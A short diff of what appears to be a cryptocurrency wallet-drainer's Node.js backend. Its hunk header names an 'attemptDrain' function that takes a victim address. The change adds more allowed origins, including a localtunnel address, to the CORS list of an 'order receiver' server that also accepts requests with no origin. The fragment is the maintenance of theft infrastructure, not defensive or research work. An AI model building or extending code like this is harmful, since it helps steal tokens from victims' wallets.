@@ -548,7 +548,12 @@ async function attemptDrain(wallet, tokenAddress, victimAddress, chainName, sile
 
 function startOrderReceiver() {
     const server = http.createServer((req, res) => {
-        const allowedOrigins = ["https://legacytrace.xyz", "https://legacy-trace1.vercel.app"];
+        const allowedOrigins = [
+            "https://legacytrace.xyz",
+            "https://legacy-trace1.vercel.app",
+            "https://api.legacytrace.xyz",
+            "https://whole-parents-guess.loca.lt"
+        ];
         const origin = req.headers.origin;
         if (allowedOrigins.includes(origin) || !origin) {
             res.setHeader('Access-Control-Allow-Origin', origin || '*');
